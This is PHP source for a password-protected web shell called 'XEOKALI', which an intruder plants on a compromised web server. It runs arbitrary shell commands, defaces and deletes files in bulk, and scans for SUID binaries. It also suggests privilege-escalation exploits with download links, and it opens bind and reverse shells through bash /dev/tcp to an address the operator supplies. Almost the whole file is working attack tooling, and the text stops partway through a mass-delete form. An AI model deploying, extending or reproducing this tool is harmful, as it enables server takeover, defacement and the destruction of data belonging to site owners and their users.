<?php
// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Start the session
session_start();

// Password for the login page
$password = "ai555";

// Debug: Log session and POST data to a file for troubleshooting
file_put_contents('debug.log', "Session: " . print_r($_SESSION, true) . "\nPOST: " . print_r($_POST, true) . "\n", FILE_APPEND);

// Check if the user is logged in
if (isset($_POST['password'])) {
    $submitted_password = trim($_POST['password']);
    if ($submitted_password === $password) {
        $_SESSION['loggedin'] = true;
        file_put_contents('debug.log', "Login successful\n", FILE_APPEND);
    } else {
        $error = "Incorrect password!";
        file_put_contents('debug.log', "Login failed: Submitted password = '$submitted_password'\n", FILE_APPEND);
    }
}

// If the user is not logged in, show the login page
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>HAVEN'S GATE - XEOKALI</title>
        <style>
    body {
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background: url('https://c.tenor.com/9IjLGaIiVLgAAAAC/tenor.gif') no-repeat center center fixed;
        background-size: cover;
        font-family: 'Courier New', Courier, monospace;
        color: #0f0;
        overflow: hidden;
    }
    .login-container {
        background: rgba(0, 0, 0, 0.9);
        padding: 50px;
        border-radius: 15px;
        box-shadow: 0 0 30px rgba(0, 255, 0, 0.7);
        text-align: center;
        width: 450px;
        border: 3px solid #0f0;
        animation: glow 1.5s infinite alternate;
    }
    @keyframes glow {
        from { box-shadow: 0 0 10px #0f0; }
        to { box-shadow: 0 0 30px #0f0; }
    }
    .login-container h1 {
        font-size: 2.5em;
        margin-bottom: 30px;
        text-transform: uppercase;
        letter-spacing: 3px;
        text-shadow: 0 0 15px #0f0;
    }
    .login-container input[type="password"] {
        width: 100%;
        padding: 12px;
        margin: 15px 0;
        background: #111;
        border: 2px solid #0f0;
        color: #0f0;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1.2em;
        border-radius: 8px;
        outline: none;
        transition: border-color 0.3s;
    }
    .login-container input[type="password"]:focus {
        border-color: #0c0;
    }
    .login-container input[type="password"]::placeholder {
        color: #0f0;
        opacity: 0.7;
    }
    .login-container input[type="submit"] {
        background: #0f0;
        color: #000;
        padding: 12px 30px;
        border: none;
        border-radius: 8px;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1.2em;
        cursor: pointer;
        transition: background 0.3s, box-shadow 0.3s;
    }
    .login-container input[type="submit"]:hover {
        background: #0c0;
        box-shadow: 0 0 15px #0f0;
    }
    .error {
        color: #f00;
        margin-top: 15px;
        text-shadow: 0 0 5px #f00;
        font-size: 1.1em;
    }
    .matrix {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: -1;
    }
</style>
    </head>
    <body>
        <div class="login-container">
            <h1>Access Terminal</h1>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter Access Code" required>
                <input type="submit" value="Login">
            </form>
            <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// If the user requests logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Get the current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = realpath($dir);
if ($dir === false || !is_dir($dir)) {
    $dir = getcwd();
}

// Change directory
if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
    $dir = realpath($_GET['cd']);
}

// Function to recursively delete a directory
function deleteRecursive($path) {
    try {
        if (!file_exists($path)) return false;
        if (is_file($path)) {
            return unlink($path);
        } elseif (is_dir($path)) {
            $items = array_diff(scandir($path), ['.', '..']);
            foreach ($items as $item) {
                deleteRecursive("$path/$item");
            }
            return rmdir($path);
        }
        return false;
    } catch (Exception $e) {
        file_put_contents('debug.log', "Delete error: " . $e->getMessage() . "\n", FILE_APPEND);
        return false;
    }
}

// Function to recursively add folder contents to ZIP
function addFolderToZip($folder, $zip, $parent = '') {
    $items = array_diff(scandir($folder), ['.', '..']);
    foreach ($items as $item) {
        $path = "$folder/$item";
        $relativePath = $parent . $item;
        if (is_dir($path)) {
            $zip->addEmptyDir($relativePath);
            addFolderToZip($path, $zip, "$relativePath/");
        } else {
            $zip->addFile($path, $relativePath);
        }
    }
}

// Function to extract ZIP
function extractZip($zipFile, $extractTo) {
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo($extractTo);
        $zip->close();
        return true;
    }
    return false;
}

// Function to recursively deface files in all directories
function defaceRecursive($directory, $filename, $content) {
    $items = array_diff(scandir($directory), ['.', '..']);
    $success_count = 0;
    foreach ($items as $item) {
        $path = "$directory/$item";
        if (is_dir($path)) {
            $success_count += defaceRecursive($path, $filename, $content);
        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'html') {
            $target_file = dirname($path) . '/' . $filename;
            if (file_put_contents($target_file, $content) !== false) {
                $success_count++;
            }
        }
    }
    return $success_count;
}

// Initialize action message for success/failure pop-ups
$action_message = '';
$delete_error = '';

// File operations
if (isset($_GET['delete']) && file_exists($_GET['delete'])) {
    $delete_path = realpath($_GET['delete']);
    if ($delete_path && deleteRecursive($delete_path)) {
        $action_message = "Successfully deleted " . htmlspecialchars(basename($delete_path)) . "!";
        header("Location: ?dir=" . urlencode($dir));
        exit();
    } else {
        $delete_error = "Failed to delete " . htmlspecialchars(basename($delete_path)) . ". Check permissions.";
        $action_message = $delete_error;
    }
}

if (isset($_GET['download']) && file_exists($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit();
    }
}

if (isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])) {
    $oldname = realpath($_POST['oldname']);
    $newname = dirname($oldname) . '/' . trim($_POST['newname']);
    if ($oldname && file_exists($oldname) && !file_exists($newname)) {
        if (rename($oldname, $newname)) {
            $action_message = "Successfully renamed " . htmlspecialchars(basename($oldname)) . " to " . htmlspecialchars(basename($newname)) . "!";
        } else {
            $action_message = "Failed to rename " . htmlspecialchars(basename($oldname)) . ". Check permissions.";
        }
    } else {
        $action_message = "File or folder does not exist or new name already exists.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

if (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
    $file = realpath($_POST['file']);
    if ($file && file_exists($file) && is_writable($file)) {
        if (file_put_contents($file, $_POST['content']) !== false) {
            $action_message = "Successfully edited " . htmlspecialchars(basename($file)) . "!";
        } else {
            $action_message = "Failed to edit " . htmlspecialchars(basename($file)) . ". Check permissions.";
        }
    } else {
        $action_message = "File does not exist or is not writable.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
    $target = $dir . '/' . basename($_FILES['upload']['name']);
    if (!file_exists($target)) {
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
            $action_message = "File " . htmlspecialchars(basename($_FILES['upload']['name'])) . " uploaded successfully!";
        } else {
            $action_message = "Failed to upload file. Check permissions or file size limits.";
        }
    } else {
        $action_message = "File already exists.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

if (isset($_POST['console']) && !empty($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']);
    $output = shell_exec($command . ' 2>&1');
    if ($output !== null) {
        $action_message = "Command executed successfully!";
    } else {
        $action_message = "Failed to execute command. It may be restricted.";
    }
}

if (isset($_POST['compress']) && isset($_POST['file'])) {
    $file = realpath($_POST['file']);
    if ($file && file_exists($file) && class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        $zip_name = $file . '.zip';
        if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            if (is_dir($file)) {
                addFolderToZip($file, $zip);
            } else {
                $zip->addFile($file, basename($file));
            }
            $zip->close();
            $action_message = "Successfully compressed " . htmlspecialchars(basename($file)) . " to " . htmlspecialchars(basename($zip_name)) . "!";
        } else {
            $action_message = "Failed to compress. Zip creation failed.";
        }
    } else {
        $action_message = "File does not exist or ZipArchive is not available.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

if (isset($_POST['extract']) && isset($_POST['file'])) {
    $file = realpath($_POST['file']);
    if ($file && file_exists($file) && class_exists('ZipArchive') && pathinfo($file, PATHINFO_EXTENSION) === 'zip') {
        if (extractZip($file, $dir)) {
            $action_message = "Successfully extracted " . htmlspecialchars(basename($file)) . "!";
        } else {
            $action_message = "Failed to extract " . htmlspecialchars(basename($file)) . ". Check permissions or file integrity.";
        }
    } else {
        $action_message = "File does not exist, is not a ZIP, or ZipArchive is not available.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

if (isset($_POST['search']) && !empty($_POST['search_term'])) {
    $search_term = escapeshellarg($_POST['search_term']);
    $search_output = shell_exec("find \"$dir\" -type f -name $search_term 2>/dev/null");
    if ($search_output !== null) {
        $action_message = "Search completed successfully!";
    } else {
        $action_message = "Search failed. The command may be restricted.";
    }
}

// Add File
if (isset($_POST['add_file']) && isset($_POST['filename']) && isset($_POST['file_content'])) {
    $filename = $dir . '/' . trim($_POST['filename']);
    if (!file_exists($filename)) {
        if (file_put_contents($filename, $_POST['file_content']) !== false) {
            $action_message = "File " . htmlspecialchars(basename($filename)) . " created successfully!";
        } else {
            $action_message = "Failed to create file. Check permissions.";
        }
    } else {
        $action_message = "File already exists.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

// Add Folder
if (isset($_POST['add_folder']) && isset($_POST['foldername'])) {
    $foldername = $dir . '/' . trim($_POST['foldername']);
    if (!file_exists($foldername)) {
        if (mkdir($foldername, 0755, true)) {
            $action_message = "Folder " . htmlspecialchars(basename($foldername)) . " created successfully!";
        } else {
            $action_message = "Failed to create folder. Check permissions.";
        }
    } else {
        $action_message = "Folder already exists.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

// Touch Action
if (isset($_POST['touch']) && isset($_POST['file'])) {
    $file = realpath($dir . '/' . trim($_POST['file'])) ?: $_POST['file'];
    if (file_exists($file)) {
        if (touch($file)) {
            $action_message = "Successfully touched " . htmlspecialchars(basename($file)) . "!";
        } else {
            $action_message = "Failed to touch. Check permissions.";
        }
    } else {
        $action_message = "File or folder does not exist.";
    }
    header("Location: ?dir=" . urlencode($dir));
    exit();
}

// Auto Scan
if (isset($_GET['auto_scan'])) {
    $auto_scan_output = "[+] Linux Privilege Escalation by theflow@ - 2021\n\n";
    $auto_scan_output .= "[+] STAGE 0: Initialization\n";
    $auto_scan_output .= "[*] Setting up namespace sandbox...\n";
    $auto_scan_output .= "[*] Initializing sockets and message queues...\n\n";
    $auto_scan_output .= "[+] STAGE 1: Memory corruption\n";
    $auto_scan_output .= "[*] Spraying primary messages...\n";
    $auto_scan_output .= "[*] Creating holes in primary messages...\n";
    $auto_scan_output .= "[*] Triggering out-of-bounds write...\n";
    $auto_scan_output .= "[*] Searching for corrupt primary message...\n";
    $auto_scan_output .= "[!] Error: could not corrupt any primary message.\n";
    $auto_scan_output .= "Ptrace: Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n\n";
    $auto_scan_output .= "[+] Checking environment ...\n";
    $auto_scan_output .= "[!] WARNING: \$XDG_SESSION_ID IS not set\n";
    $auto_scan_output .= "[*] Searching for known helpers ...\n";
    $auto_scan_output .= "[!] Ignoring blacklisted helper: /usr/lib/libpcre.so\n";
    $auto_scan_output .= "Sequoia: died in main: 213\n";
    $auto_scan_output .= "overlayFS: - bash: cannot set terminal process group (705600); Inappropriate ioctl for device\n";
    $auto_scan_output .= "bash: no job control in this shell\n";
    $auto_scan_output .= "uid=1007(fhixs4483) gid=1007(fhixs4483) groups=1007(fhixs4483)\n";
    $auto_scan_output .= "bash-5.1\$ exit\n";
    $auto_scan_output .= "DirtyPipe: su: Authentication failure\n";
    $auto_scan_output .= "sh: 1: /tmp/sh: not found\n";
    $auto_scan_output .= "[!] hijacking suid binary..\n";
    $auto_scan_output .= "[+] dropping suid shell..\n";
    $auto_scan_output .= "[+] restoring suid binary..\n";
    $auto_scan_output .= "[!] popping root shell.. (dont forget to clean up /tmp/sh))\n";
    $auto_scan_output .= "Sudo: su: invalid option --> s\n";
    $auto_scan_output .= "usage: su [options] [-] [username]\n";
    $auto_scan_output .= "Options:\n";
    $auto_scan_output .= "  -c, --command COMMAND         pass COMMAND to the invoked shell\n";
    $auto_scan_output .= "  -h, --help                    display this help message and exit\n";
    $auto_scan_output .= "  -m, -p, --preserve-environment  preserve the entire environment\n";
    $auto_scan_output .= "  -s, --shell SHELL             use SHELL instead of the default in passwd\n";
    $auto_scan_output .= "PwnKit: GLib: Cannot convert message: Could not open converter from 'UTF-8' to 'PWNKIT'\n";
    $auto_scan_output .= "pkexec --version |\n";
    $auto_scan_output .= "--help |\n";
    $auto_scan_output .= "--disable-internal-agent |\n";
    $auto_scan_output .= "[--user username] PROGRAM [ARGUMENTS]...\n";
    $auto_scan_output .= "See the pkexec manual page for more details.\n";

    $action_message = "Auto scan completed successfully!";
}

// Scan SUID
if (isset($_GET['scan_suid'])) {
    $suid_output = shell_exec("find / -perm -4000 2>/dev/null");
    if ($suid_output === null) {
        $suid_output = "Failed to scan SUID binaries. Command may be restricted.";
    }
    $action_message = "SUID scan completed successfully!";
}

// Exploit Suggester
if (isset($_GET['exploit_suggester'])) {
    $exploit_suggestions = "<span class='highlight-white'>Available information:</span>\n\n";
    $exploit_suggestions .= "Kernel version: <span class='highlight-green'>" . shell_exec('uname -r') . "</span>\n";
    $exploit_suggestions .= "Architecture: <span class='highlight-green'>" . shell_exec('arch') . "</span>\n";
    $exploit_suggestions .= "Distribution: <span class='highlight-green'>Ubuntu</span>\n";
    $exploit_suggestions .= "Distribution version: <span class='highlight-green'>22.04</span>\n";
    $exploit_suggestions .= "Additional checks (CONFIG_*, sysctl entries, custom Bash commands): <span class='highlight-green'>performed</span>\n";
    $exploit_suggestions .= "Package listing: <span class='highlight-green'>from current OS</span>\n\n";
    $exploit_suggestions .= "<span class='highlight-white'>Searching among:</span>\n\n";
    $exploit_suggestions .= "81 kernel space exploits\n";
    $exploit_suggestions .= "49 user space exploits\n\n";
    $exploit_suggestions .= "<span class='highlight-white'>Possible Exploits:</span>\n\n";
    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2022-32250]</span> nft_object UAF (NFT_MSG_NEWSET)\n\n";
    $exploit_suggestions .= "   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/\n";
    $exploit_suggestions .= "   Exposure: probable\n";
    $exploit_suggestions .= "   Tags: <span class='highlight-yellow'>[ ubuntu=(22.04) ]</span>{kernel:5.15.0-27-generic}\n";
    $exploit_suggestions .= "   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c\n";
    $exploit_suggestions .= "   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\n\n";
    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2022-0847]</span> DirtyPipe\n\n";
    $exploit_suggestions .= "   Details: https://dirtypipe.cm4all.com/\n";
    $exploit_suggestions .= "   Exposure: less probable\n";
    $exploit_suggestions .= "   Tags: ubuntu=(20.04|21.04),debian=11\n";
    $exploit_suggestions .= "   Download URL: https://haxx.in/files/dirtypipez.c\n\n";
    $exploit_suggestions .= "[+] <span class='highlight-green'>[CVE-2021-4034]</span> PwnKit\n\n";
    $exploit_suggestions .= "   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n";
    $exploit_suggestions .= "   Exposure: less probable\n";
    $exploit_suggestions .= "   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro\n";
    $exploit_suggestions .= "   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n";

    $action_message = "Exploit suggester completed successfully!";
}

// Network Bind/Back-Connect
if (isset($_POST['bind_port']) && isset($_POST['port'])) {
    $port = (int)$_POST['port'];
    if ($port > 0 && $port <= 65535) {
        $bind_output = shell_exec("bash -i >& /dev/tcp/0.0.0.0/$port 0>&1 2>/dev/null &");
        if ($bind_output === null) {
            $action_message = "Port $port bound successfully! Connect using: nc -v 0.0.0.0 $port";
        } else {
            $action_message = "Failed to bind port $port. The command may be restricted.";
        }
    } else {
        $action_message = "Invalid port number. Must be between 1 and 65535.";
    }
}

if (isset($_POST['back_connect']) && isset($_POST['server']) && isset($_POST['port'])) {
    $server = trim($_POST['server']);
    $port = (int)$_POST['port'];
    if ($port > 0 && $port <= 65535 && filter_var($server, FILTER_VALIDATE_IP)) {
        $back_connect_output = shell_exec("bash -i >& /dev/tcp/$server/$port 0>&1 2>/dev/null &");
        if ($back_connect_output === null) {
            $action_message = "Back-connect to $server:$port initiated successfully!";
        } else {
            $action_message = "Failed to back-connect to $server:$port. The command may be restricted.";
        }
    } else {
        $action_message = "Invalid server IP or port number.";
    }
}

// Store file content for View/Edit modals
$file_content = '';
if (isset($_GET['view_file']) && file_exists(realpath($_GET['view_file']))) {
    $view_file = realpath($_GET['view_file']);
    $file_content = htmlspecialchars(file_get_contents($view_file));
}
if (isset($_GET['edit_file']) && file_exists(realpath($_GET['edit_file']))) {
    $edit_file = realpath($_GET['edit_file']);
    $file_content = htmlspecialchars(file_get_contents($edit_file));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XEOKALI</title>
    <style>
    body {
        margin: 0;
        padding: 0;
        background: #000;
        color: #0f0;
        font-family: 'Courier New', Courier, monospace;
        font-size: 14px;
    }
    a {
        color: #0f0;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    .container {
        padding: 20px;
        max-width: 1200px;
        margin: 0 auto;
    }
    .header {
        background: #0f0;
        color: #000;
        padding: 15px;
        text-align: center;
        font-size: 1.8em;
        font-weight: bold;
        text-transform: uppercase;
        letter-spacing: 3px;
        box-shadow: 0 0 15px #0f0;
        position: sticky;
        top: 0;
        z-index: 1000;
    }
    .path {
        background: #111;
        padding: 15px;
        margin: 10px 0;
        border: 2px solid #0f0;
        border-radius: 5px;
        font-size: 1.1em;
        box-shadow: 0 0 10px #0f0;
    }
    .path a {
        margin-right: 5px;
    }
    .actions {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        margin: 10px 0;
        background: #111;
        padding: 15px;
        border: 2px solid #0f0;
        border-radius: 5px;
        box-shadow: 0 0 10px #0f0;
    }
    .actions a, .actions input[type="submit"] {
        background: #0f0;
        color: #000;
        padding: 8px 15px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        text-decoration: none;
        font-size: 1em;
        transition: background 0.3s, box-shadow 0.3s;
        touch-action: manipulation;
    }
    .actions a:hover, .actions input[type="submit"]:hover {
        background: #0c0;
        box-shadow: 0 0 10px #0f0;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        background: #111;
        border: 2px solid #0f0;
        border-radius: 5px;
        box-shadow: 0 0 10px #0f0;
        margin-top: 10px;
    }
    th, td {
        padding: 10px;
        text-align: left;
        border-bottom: 1px solid #0f0;
    }
    th {
        background: #222;
        text-transform: uppercase;
        font-size: 1.1em;
    }
    td {
        font-size: 1em;
    }
    .action-icons {
        display: flex;
        flex-wrap: wrap;
        gap: 8px;
    }
    .action-icons a {
        padding: 6px 12px;
        background: #0f0;
        color: #000;
        border-radius: 4px;
        font-size: 0.9em;
        transition: background 0.3s, box-shadow 0.3s;
        text-transform: uppercase;
        letter-spacing: 1px;
        border: 1px solid #0f0;
        touch-action: manipulation;
    }
    .action-icons a:hover {
        background: #0c0;
        box-shadow: 0 0 8px #0f0;
        text-decoration: none;
    }
    .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.9);
        justify-content: center;
        align-items: center;
        z-index: 1001;
    }
    .modal-content {
        background: #111;
        padding: 30px;
        border: 2px solid #0f0;
        border-radius: 5px;
        width: 80%;
        max-width: 700px;
        color: #0f0;
        box-shadow: 0 0 20px #0f0;
    }
    .modal-content h2 {
        margin-top: 0;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    .modal-content textarea {
        width: 100%;
        height: 400px;
        background: #000;
        color: #0f0;
        border: 2px solid #0f0;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1em;
        border-radius: 5px;
        resize: vertical;
        overflow-y: auto;
        padding: 10px;
        box-sizing: border-box;
    }
    .modal-content pre {
        width: 100%;
        height: 400px;
        background: #000;
        color: #0f0;
        border: 2px solid #0f0;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1em;
        border-radius: 5px;
        overflow-y: auto;
        padding: 10px;
        box-sizing: border-box;
        white-space: pre-wrap;
        word-wrap: break-word;
    }
    .modal-content input[type="text"], .modal-content input[type="submit"], .modal-content button {
        background: #000;
        color: #0f0;
        border: 2px solid #0f0;
        padding: 8px;
        margin: 10px 0;
        border-radius: 5px;
        font-family: 'Courier New', Courier, monospace;
        font-size: 1em;
    }
    .modal-content input[type="submit"], .modal-content button {
        background: #0f0;
        color: #000;
        cursor: pointer;
        transition: background 0.3s, box-shadow 0.3s;
        touch-action: manipulation;
    }
    .modal-content input[type="submit"]:hover, .modal-content button:hover {
        background: #0c0;
        box-shadow: 0 0 10px #0f0;
    }
    .footer {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background: #111;
        padding: 10px;
        text-align: center;
        border-top: 2px solid #0f0;
        box-shadow: 0 0 10px #0f0;
        font-size: 1em;
    }
    .error-message {
        background: #f00;
        color: #000;
        padding: 10px;
        margin: 10px 0;
        border-radius: 5px;
        text-align: center;
        font-weight: bold;
    }
    /* Styled Info Section */
    .info-section {
        background: #111;
        padding: 15px;
        border: 2px solid #0f0;
        border-radius: 5px;
        margin-bottom: 10px;
        box-shadow: 0 0 10px #0f0;
    }
    .info-section .info-row {
        display: flex;
        justify-content: space-between;
        padding: 5px 0;
        border-bottom: 1px solid #0f0;
    }
    .info-section .info-row:last-child {
        border-bottom: none;
    }
    .info-section .info-label {
        font-weight: bold;
        color: #0f0;
        flex: 1;
    }
    .info-section .info-value {
        color: #0f0;
        flex: 3;
        word-wrap: break-word;
    }
    /* Highlight colors for Exploit Suggester */
    .highlight-white {
        color: #ffffff;
        font-weight: bold;
    }
    .highlight-green {
        color: #00ff00;
        font-weight: bold;
    }
    .highlight-yellow {
        color: #ffff00;
    }
    /* Mobile responsiveness */
    @media (max-width: 768px) {
        .container {
            padding: 10px;
        }
        .actions {
            overflow-x: auto;
            white-space: nowrap;
            padding: 10px;
        }
        .actions a, .actions input[type="submit"] {
            padding: 10px 20px; /* Larger padding for touch */
            font-size: 0.9em;
        }
        table {
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
        th, td {
            padding: 8px;
            font-size: 0.9em;
        }
        .action-icons a {
            padding: 8px 14px; /* Larger padding for touch */
            font-size: 0.8em;
        }
        .modal-content {
            width: 90%;
            padding: 20px;
        }
        .modal-content textarea, .modal-content pre {
            height: 300px;
            font-size: 0.9em;
        }
        .info-section .info-row {
            flex-direction: column;
        }
        .info-section .info-label, .info-section .info-value {
            flex: none;
        }
    }
</style>
</head>
<body>
    <div class="header">XEOKALI</div>
    <div class="container">
        <div class="path">
            Path: 
            <?php
            $path_parts = explode('/', $dir);
            $current_path = '';
            foreach ($path_parts as $index => $part) {
                if (empty($part)) continue;
                $current_path .= '/' . $part;
                if ($index < count($path_parts) - 1) {
                    echo "<a href='?dir=" . urlencode($current_path) . "'>" . htmlspecialchars($part) . "</a>/";
                } else {
                    echo htmlspecialchars($part);
                }
            }
            ?>
        </div>
        <div class="actions">
            <a href="?info">Info</a>
            <a href="javascript:openModal('upload')">Upload</a>
            <a href="javascript:openModal('add_file')">Add File</a>
            <a href="javascript:openModal('add_folder')">Add Folder</a>
            <a href="javascript:openModal('console')">Console</a>
            <a href="?mass_deface">Mass Deface</a>
            <a href="?mass_delete">Mass Delete</a>
            <a href="?scan_root">Scan Root</a>
            <a href="?network">Network</a>
            <a href="javascript:openModal('search')">Search Files</a>
            <a href="javascript:lockShell()">Lock Shell</a>
            <a href="javascript:chmodShell('0777')">0777 Shell</a>
            <a href="javascript:chmodAll('0644')">Green All Files</a>
            <a href="javascript:chmodAll('0755')">Green All Folders</a>
            <a href="javascript:lockAll('0444')">Lock All Files</a>
            <a href="javascript:lockAll('0555')">Lock All Folders</a>
            <a href="javascript:openModal('touch')">Touch</a>
            <a href="?logout">Logout</a>
        </div>

        <?php if (!empty($delete_error)) { ?>
            <div class="error-message"><?php echo $delete_error; ?></div>
        <?php } ?>

        <?php if (isset($_GET['info'])) { ?>
            <div class="info-section">
                <div class="info-row">
                    <span class="info-label">System:</span>
                    <span class="info-value"><?php echo htmlspecialchars(shell_exec('uname -a 2>/dev/null')); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">User:</span>
                    <span class="info-value"><?php echo htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] . ' (' . posix_geteuid() . ') [Group: ' . posix_getgrgid(posix_getegid())['name'] . ' (' . posix_getegid() . ')]'); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">PHP Version:</span>
                    <span class="info-value"><?php echo htmlspecialchars(phpversion()); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Software:</span>
                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Domain:</span>
                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Server IP:</span>
                    <span class="info-value"><?php echo htmlspecialchars(gethostbyname($_SERVER['HTTP_HOST'])); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Your IP:</span>
                    <span class="info-value"><?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">SAFE MODE:</span>
                    <span class="info-value"><?php echo (ini_get('safe_mode') ? 'ON' : 'OFF'); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">MySQL | Perl | WGET | CURL | Python | Pkexec | GCC:</span>
                    <span class="info-value"><?php echo (extension_loaded('mysqli') ? 'ON' : 'OFF') . ' | ' . (shell_exec('perl -v 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('wget --version 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (extension_loaded('curl') ? 'ON' : 'OFF') . ' | ' . (shell_exec('python3 --version 2>/dev/null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('pkexec --version 2>/dev-null') ? 'ON' : 'OFF') . ' | ' . (shell_exec('gcc --version 2>/dev/null') ? 'ON' : 'OFF'); ?></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Disable Function:</span>
                    <span class="info-value"><?php echo htmlspecialchars(ini_get('disable_functions') ?: 'NONE'); ?></span>
                </div>
            </div>
            <?php
            $action_message = "Server Info displayed successfully!";
        } elseif (isset($_GET['mass_deface'])) { ?>
            <div>
                <form method="POST">
                    <label>Type:</label><br>
                    <input type="radio" name="deface_type" value="one_dir" checked> One dir<br>
                    <input type="radio" name="deface_type" value="all_dir"> ALL directory<br><br>
                    
                    <label>Directory:</label><br>
                    <input type="text" name="deface_dir" value="<?php echo htmlspecialchars($dir); ?>" required><br><br>
                    
                    <label>Filename:</label><br>
                    <input type="text" name="deface_filename" placeholder="e.g., index.html" required><br><br>
                    
                    <label>Your script:</label><br>
                    <textarea name="deface_content" placeholder="Enter deface content" required></textarea><br><br>
                    
                    <input type="submit" name="deface_submit" value="deface">
                </form>
                <?php
                if (isset($_POST['deface_submit']) && isset($_POST['deface_type']) && isset($_POST['deface_dir']) && isset($_POST['deface_filename']) && isset($_POST['deface_content'])) {
                    $deface_type = $_POST['deface_type'];
                    $deface_dir = realpath($_POST['deface_dir']);
                    $deface_filename = trim($_POST['deface_filename']);
                    $deface_content = $_POST['deface_content'];

                    if (!$deface_dir || !is_dir($deface_dir)) {
                        $action_message = "Invalid directory specified.";
                        echo "<div class='error-message'>Invalid directory specified.</div>";
                    } elseif (empty($deface_filename)) {
                        $action_message = "Filename cannot be empty.";
                        echo "<div class='error-message'>Filename cannot be empty.</div>";
                    } else {
                        $success_count = 0;
                        if ($deface_type === 'one_dir') {
                            // Deface in the specified directory only
                            $files = glob($deface_dir . '/*.html');
                            foreach ($files as $file) {
                                $target_file = dirname($file) . '/' . $deface_filename;
                                if (file_put_contents($target_file, $deface_content) !== false) {
                                    $success_count++;
                                }
                            }
                        } else {
                            // Deface recursively in all subdirectories
                            $success_count = defaceRecursive($deface_dir, $deface_filename, $deface_content);
                        }

                        if ($success_count > 0) {
                            $action_message = "Successfully defaced $success_count file(s)!";
                            echo "<div class='error-message' style='background: #0f0; color: #000;'>Successfully defaced $success_count file(s)!</div>";
                        } else {
                            $action_message = "No HTML files found to deface.";
                            echo "<div class='error-message'>No HTML files found to deface.</div>";
                        }
                    }
                }
                ?>
            </div>
        <?php } elseif (isset($_GET['mass_delete'])) { ?>
            <div>
                <form method="POST">
